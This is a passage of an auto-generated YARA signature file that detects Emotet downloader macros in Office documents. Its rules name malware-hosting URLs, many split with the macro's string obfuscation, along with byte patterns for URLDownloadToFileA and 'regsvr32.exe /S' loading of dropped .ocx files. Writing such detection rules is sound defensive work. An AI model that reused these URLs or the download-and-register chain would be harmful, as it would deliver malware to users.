        $x_1_3 = "//bsbmakina.com.tr/logo/eVWaAWm/\",\"" ascii //weight: 1
        $x_1_4 = "//bureauinternacional.com.ar/contador-analista-proyectos/2w/\",\"" ascii //weight: 1
        $x_1_5 = "//www.valyval.com/pun/VAYL/\",\"" ascii //weight: 1
        $x_1_6 = "//cabans.com/CeudWYRQEzZgrHPcI/\",\"" ascii //weight: 1
        $x_1_7 = "//calzadoyuyin.com/cgj-bin/jZPff/\",\"" ascii //weight: 1
        $x_1_8 = "//cagranus.com/slide/mcqAFuMhaekn/\",\"" ascii //weight: 1
        $x_1_9 = "//aesiafrique.com/azerty/Xiuf0wUfv1yl/\",\"" ascii //weight: 1
        $x_1_10 = "//www.agentofficetest.com/Uploads/gyF0i2X/\",\"" ascii //weight: 1
        $x_1_11 = "//www.cabinet-psyche.com/eCMdgqeC9jjE/\",\"" ascii //weight: 1
        $x_1_12 = "//cabbqsupply.com/wp-content/OcTt/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVS_2147821375_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVS!MTB"
        threat_id = "2147821375"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//b\"&\"yr\"&\"dn\"&\"es\"&\"t3.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/T\"&\"E\"&\"q/\",\"" ascii //weight: 1
        $x_1_2 = "//c\"&\"ar\"&\"bo\"&\"nb\"&\"ro\"&\"s.c\"&\"o.z\"&\"a/l\"&\"og\"&\"s/K\"&\"ST\"&\"JN\"&\"dx\"&\"Z7\"&\"3h\"&\"IZ\"&\"PK\"&\"dd\"&\"ED\"&\"T/\",\"" ascii //weight: 1
        $x_1_3 = "//w\"&\"w\"&\"w.bu\"&\"bb\"&\"lef\"&\"oot\"&\"ba\"&\"lle\"&\"ur\"&\"o\"&\"pe.d\"&\"e/w\"&\"p-a\"&\"dm\"&\"in/3\"&\"aM\"&\"Mn\"&\"YP/\",\"" ascii //weight: 1
        $x_1_4 = "//ca\"&\"so\"&\"v.c\"&\"o\"&\"m/p\"&\"ro\"&\"xy/k\"&\"k0\"&\"OW\"&\"cst\"&\"qP\"&\"OO\"&\"ye\"&\"G/\",\"" ascii //weight: 1
        $x_1_5 = "/\"&\"/\"&\"c\"&\"h\"&\"a\"&\"l\"&\"k\"&\"i\"&\"e.m\"&\"e.u\"&\"k/c\"&\"g\"&\"i-b\"&\"i\"&\"n/g\"&\"M\"&\"Lu\"&\"eb\"&\"zG\"&\"2R\"&\"sk\"&\"kJ\"&\"X\"&\"w\"&\"Y/\",\"" ascii //weight: 1
        $x_1_6 = "/\"&\"/c\"&\"e\"&\"n\"&\"t\"&\"a\"&\"u\"&\"r\"&\"u\"&\"s\"&\"sits.c\"&\"o\"&\"m/a\"&\"s\"&\"s\"&\"e\"&\"t\"&\"s/F\"&\"L/\",\"" ascii //weight: 1
        $x_1_7 = "/\"&\"/\"&\"w\"&\"w\"&\"w.c\"&\"ec\"&\"am\"&\"br\"&\"il\"&\"s.c\"&\"a\"&\"t/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/0\"&\"Kw\"&\"OS\"&\"fN\"&\"DE\"&\"Sl\"&\"zV\"&\"Mo\"&\"c/\",\"" ascii //weight: 1
        $x_1_8 = "/\"&\"/\"&\"c\"&\"a\"&\"n\"&\"s\"&\"a\"&\"l.c\"&\"l/c\"&\"g\"&\"i-b\"&\"i\"&\"n/b\"&\"es\"&\"SI\"&\"JTf\"&\"Ok\"&\"0D\"&\"tH\"&\"ZR/\",\"" ascii //weight: 1
        $x_1_9 = "//a\"&\"ni\"&\"ma-t\"&\"er\"&\"ap\"&\"ie.c\"&\"z/l\"&\"an\"&\"gu\"&\"ag\"&\"e/z\"&\"ZG\"&\"GK\"&\"g/\",\"" ascii //weight: 1
        $x_1_10 = "//w\"&\"il\"&\"us\"&\"z.p\"&\"l/f\"&\"5a\"&\"02\"&\"c0\"&\"b/b\"&\"D/\",\"" ascii //weight: 1
        $x_1_11 = "/\"&\"/w\"&\"w\"&\"w.t\"&\"h\"&\"u\"&\"y\"&\"b\"&\"a\"&\"o\"&\"h\"&\"u\"&\"y.c\"&\"o\"&\"m/w\"&\"p-c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t/r\"&\"u\"&\"z\"&\"W\"&\"Q\"&\"Q\"&\"k\"&\"q\"&\"n\"&\"3\"&\"o\"&\"c\"&\"I\"&\"K\"&\"V\"&\"o\"&\"P\"&\"w\"&\"B/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDED_2147821450_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDED!MTB"
        threat_id = "2147821450"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://cashmailsystem.com/upload/XmPSGLcygR7/" ascii //weight: 1
        $x_1_2 = ":\"&\"/\"&\"/i\"&\"ng\"&\"el\"&\"se.n\"&\"e\"&\"t/n\"&\"dM\"&\"mq\"&\"xh/" ascii //weight: 1
        $x_1_3 = ":\"&\"/\"&\"/k\"&\"wi\"&\"ck\"&\"co\"&\"nn\"&\"ec\"&\"t.c\"&\"o\"&\"m/i\"&\"m-m\"&\"es\"&\"se\"&\"ng\"&\"er/S\"&\"zr\"&\"b9\"&\"Et\"&\"hO\"&\"X9\"&\"1/" ascii //weight: 1
        $x_1_4 = ":\"&\"/\"&\"/m\"&\"an\"&\"ch\"&\"es\"&\"te\"&\"rs\"&\"lt.c\"&\"o.u\"&\"k/a-to-z-of-s\"&\"l\"&\"t/x\"&\"Og\"&\"w/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SXS_2147821487_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SXS!MTB"
        threat_id = "2147821487"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":\"&\"/\"&\"/a\"&\"k\"&\"a\"&\"r\"&\"w\"&\"e\"&\"b.n\"&\"e\"&\"t/c\"&\"g\"&\"i-b\"&\"i\"&\"n/D\"&\"e\"&\"Z\"&\"4\"&\"p\"&\"4\"&\"x\"&\"G/\"" ascii //weight: 1
        $x_1_2 = "://c\"&\"a\"&\"l\"&\"z\"&\"a\"&\"d\"&\"o\"&\"y\"&\"u\"&\"y\"&\"i\"&\"n.c\"&\"o\"&\"m/c\"&\"g\"&\"j-b\"&\"i\"&\"n/j\"&\"Z\"&\"P\"&\"f\"&\"f/\"" ascii //weight: 1
        $x_1_3 = ":\"&\"/\"&\"/c\"&\"a\"&\"b\"&\"a\"&\"n\"&\"s.c\"&\"o\"&\"m/C\"&\"e\"&\"u\"&\"d\"&\"W\"&\"Y\"&\"R\"&\"Q\"&\"E\"&\"z\"&\"Z\"&\"g\"&\"r\"&\"H\"&\"P\"&\"c\"&\"I/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VASM_2147821569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VASM!MTB"
        threat_id = "2147821569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 72 65 67 73 76 72 33 32 2e 65 78 65 20 2f 53 20 2e 2e 5c 63 75 69 ?? 2e 6f 63 78}  //weight: 1, accuracy: Low
        $x_1_2 = "c\"&\"e\"&\"n\"&\"t\"&\"a\"&\"u\"&\"r\"&\"u\"&\"s\"&\"sits.c\"&\"o\"&\"m/a\"&\"s\"&\"s\"&\"e\"&\"t\"&\"s/F\"&\"L/" ascii //weight: 1
        $x_1_3 = "c\"&\"a\"&\"n\"&\"s\"&\"a\"&\"l.c\"&\"l/c\"&\"g\"&\"i-b\"&\"i\"&\"n/b\"&\"es\"&\"SI\"&\"JTf\"&\"Ok\"&\"0D\"&\"tH\"&\"ZR/" ascii //weight: 1
        $x_1_4 = "c\"&\"h\"&\"a\"&\"l\"&\"k\"&\"i\"&\"e.m\"&\"e.u\"&\"k/c\"&\"g\"&\"i-b\"&\"i\"&\"n/g\"&\"M\"&\"Lu\"&\"eb\"&\"zG\"&\"2R\"&\"sk\"&\"kJ\"&\"X\"&\"w\"&\"Y/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STQV_2147821641_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STQV!MTB"
        threat_id = "2147821641"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://b\"&\"ee\"&\"sl\"&\"an\"&\"dk\"&\"er\"&\"ma\"&\"n.i\"&\"r/X\"&\"PF\"&\"vB\"&\"Dr\"&\"Nk\"&\"T/lU\"&\"kO\"&\"x4\"&\"VA\"&\"Oi\"&\"zI\"&\"d7\"&\"u/" ascii //weight: 1
        $x_1_2 = "://c\"&\"er\"&\"di.c\"&\"o\"&\"m/_d\"&\"er\"&\"iv\"&\"ed/J\"&\"4F\"&\"u7\"&\"Vm\"&\"GZ\"&\"Q7\"&\"rG\"&\"A/" ascii //weight: 1
        $x_1_3 = "s://w\"&\"w\"&\"wc\"&\"ha\"&\"si\"&\"ng\"&\"ma\"&\"ve\"&\"ri\"&\"ck\"&\"s.c\"&\"o.k\"&\"e/a\"&\"ge\"&\"nd\"&\"aa\"&\"fr\"&\"ik\"&\"ad\"&\"eb\"&\"at\"&\"es.c\"&\"o.k\"&\"e/Qz\"&\"nO\"&\"FM\"&\"KV\"&\"9R/" ascii //weight: 1
        $x_1_4 = "//b\"&\"sb\"&\"ma\"&\"ki\"&\"na.c\"&\"o\"&\"m.t\"&\"r/lo\"&\"go/e\"&\"VW\"&\"aA\"&\"Wm/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOAI_2147821682_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOAI!MTB"
        threat_id = "2147821682"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.boraintercambios.com.br/wp-includes/AN4ixiH4Th/" ascii //weight: 1
        $x_1_2 = "://brigadir.com/bkp/SwrVs4yU/" ascii //weight: 1
        $x_1_3 = "://handboog6.nl/META-INF/f/" ascii //weight: 1
        $x_1_4 = "://brb-ljubuski.com/wp-content/2MODCk0UZasTCL6tm/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVT_2147821725_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVT!MTB"
        threat_id = "2147821725"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//www.athanlifeapi.com.ar/Archivos/UHjXQM6L23N/\",\"" ascii //weight: 1
        $x_1_2 = "//breakdownlanemovie.com/wp-admin/ZMU4aSaYleS/\",\"" ascii //weight: 1
        $x_1_3 = "//chaledooleo.com.br/headers/nwQNCuxK0k5OwyXSPyP/\",\"" ascii //weight: 1
        $x_1_4 = "//cannipius.nl/cgi-bin/TgPA/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SDPK_2147822322_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SDPK!MTB"
        threat_id = "2147822322"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bdtin.com/cache/4G8pl/" ascii //weight: 1
        $x_1_2 = "/bascoysonido.com.ar/cgi-bin/AmUUPhWK6oTKLzHpl7zm/" ascii //weight: 1
        $x_1_3 = "/basnetbd.com/ckfinder/K0a/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEE_2147822330_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEE!MTB"
        threat_id = "2147822330"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":\"&\"/\"&\"/c\"&\"ol\"&\"or\"&\"dr\"&\"op\"&\"sg\"&\"u.c\"&\"o\"&\"m/7\"&\"DO\"&\"R\"&\"fi\"&\"di\"&\"Au/B\"&\"qu\"&\"oS\"&\"U/" ascii //weight: 1
        $x_1_2 = ":\"&\"/\"&\"/e\"&\"wi\"&\"ng\"&\"co\"&\"ns\"&\"ul\"&\"ti\"&\"ng.c\"&\"o\"&\"m/b\"&\"u\"&\"y/E\"&\"wj\"&\"7o\"&\"Yj\"&\"hY\"&\"Q/" ascii //weight: 1
        $x_1_3 = ":\"&\"/\"&\"/ce\"&\"ra\"&\"mi\"&\"ca\"&\"la\"&\"fo\"&\"rt\"&\"al\"&\"ez\"&\"a.c\"&\"o\"&\"m/c\"&\"s\"&\"s/5\"&\"DS\"&\"BC\"&\"CH\"&\"0/" ascii //weight: 1
        $x_1_4 = ":\"&\"/\"&\"/th\"&\"uy\"&\"ba\"&\"oh\"&\"uy.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/V\"&\"xh\"&\"kY\"&\"wH\"&\"7/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAX_2147822389_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAX!MTB"
        threat_id = "2147822389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://bvirtual.com/affinita/kCO/" ascii //weight: 1
        $x_1_2 = "://cfp-courses.com/key/hs27/" ascii //weight: 1
        $x_1_3 = "://www.fundacioncedes.org/_installation/oDPga6nfhkRo/" ascii //weight: 1
        $x_1_4 = "://buildgujarat.com/wp-admin/oJV7bk9onm/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_DDPD_2147822409_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.DDPD!MTB"
        threat_id = "2147822409"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\hpd1.ocx" ascii //weight: 1
        $x_1_2 = "\\hpd2.ocx" ascii //weight: 1
        $x_1_3 = "\\hpd3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVU_2147822452_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVU!MTB"
        threat_id = "2147822452"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 ?? ?? ?? 28 29 ?? ?? ?? 52 4e ?? ?? ?? 65 ?? ?? ?? 22 2c 22 ?? ?? ?? 64 6c 65 5f 6f 6c 64 2f 39 67 69 67 6c 48 72 67 32 74 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {52 45 54 55 [0-50] 2f 4f 6c 22 26 22 64 2f 55 22 26 22 6c 66 22 26 22 47 47 22 26 22 4e 4e 22 26 22 36 78 22 26 22 62 61 22 26 22 75 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEF_2147822455_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEF!MTB"
        threat_id = "2147822455"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.dnahealth.gr/wp-content/QkkKMaLwy4jURh6FD/" ascii //weight: 1
        $x_1_2 = "://www.campusconindigital.org/moodle_old/9giglHrg2t/" ascii //weight: 1
        $x_1_3 = "://www.eapro.in/wp-admin/sf2MppPW30cKaWeko/" ascii //weight: 1
        $x_1_4 = "://www.digitalkhulna.com/wp-admin/L2z2e/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVV_2147822824_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVV!MTB"
        threat_id = "2147822824"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "i\"&\"nn\"&\"in\"&\"g/N\"&\"gm\"&\"BH\"&\"48\"&\"GC\"&\"zo\"&\"vE\"&\"IA\"&\"gJ\"&\"Y/" ascii //weight: 1
        $x_1_2 = "o\"&\"m/\"&\"ra\"&\"nd_i\"&\"ma\"&\"ge\"&\"s/N\"&\"T5\"&\"Nj\"&\"K6\"&\"o/" ascii //weight: 1
        $x_1_3 = "n\"&\"/w\"&\"p-a\"&\"dm\"&\"in/c\"&\"b/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEH_2147822861_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEH!MTB"
        threat_id = "2147822861"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "o\"&\"rl\"&\"a.e\"&\"s/t\"&\"m\"&\"p/v\"&\"i9\"&\"8Y\"&\"EQ\"&\"q/" ascii //weight: 1
        $x_1_2 = "m\"&\"/im\"&\"ag\"&\"es/G\"&\"G1\"&\"d8\"&\"an/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOAJ_2147822898_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOAJ!MTB"
        threat_id = "2147822898"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "g\"&\"sd\"&\"c.p\"&\"l/s\"&\"mi\"&\"ec\"&\"io/1\"&\"9V\"&\"Yf\"&\"hH\"&\"Lp/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMGG_2147823548_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMGG!MTB"
        threat_id = "2147823548"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-15] 28 29 [0-15] 52 4e [0-15] 65 [0-15] 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMGF_2147823749_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMGF!MTB"
        threat_id = "2147823749"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-15] 5c [0-15] 2e 6f 63 78 42}  //weight: 1, accuracy: Low
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EEPD_2147823751_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EEPD!MTB"
        threat_id = "2147823751"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\oadw1.ocx" ascii //weight: 1
        $x_1_2 = "\\oadw2.ocx" ascii //weight: 1
        $x_1_3 = "\\oadw4.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RAGG_2147824026_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RAGG!MTB"
        threat_id = "2147824026"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-10] 28 29 [0-10] 52 4e [0-10] 65 00 9f 22 [0-10] 3a [0-10] 3d [0-10] 2c [0-10] 5c [0-10] 43 [0-10] 41 [0-31] 4c}  //weight: 1, accuracy: Low
        $n_2_2 = "auto_open" ascii //weight: -2
        $n_2_3 = "Copyright 1995" ascii //weight: -2
        $n_2_4 = "Order" ascii //weight: -2
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_DD_2147834450_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.DD!MTB"
        threat_id = "2147834450"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "1.ooccxx" ascii //weight: 1
        $x_1_2 = "2.ooccxx" ascii //weight: 1
        $x_1_3 = "3.ooccxx" ascii //weight: 1
        $x_1_4 = "4.ooccxx" ascii //weight: 1
        $x_1_5 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_JEP_2147834462_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.JEP!MTB"
        threat_id = "2147834462"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "JJCCBB" ascii //weight: 1
        $x_1_2 = "C:\\Windows\\System32\\regsvr32.exe" ascii //weight: 1
        $x_1_3 = ".ooccxx" ascii //weight: 1
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVX_2147834886_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVX!MTB"
        threat_id = "2147834886"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 72 65 67 73 76 72 33 32 2e 65 78 65 20 2f 53 20 2e 2e 5c [0-5] 33 2e 6f 6f 6f 63 63 63 78 78 78}  //weight: 1, accuracy: Low
        $x_1_2 = "2.ooocccxxx" ascii //weight: 1
        $x_1_3 = "1.ooocccxxx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KK_2147842339_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KK!MTB"
        threat_id = "2147842339"
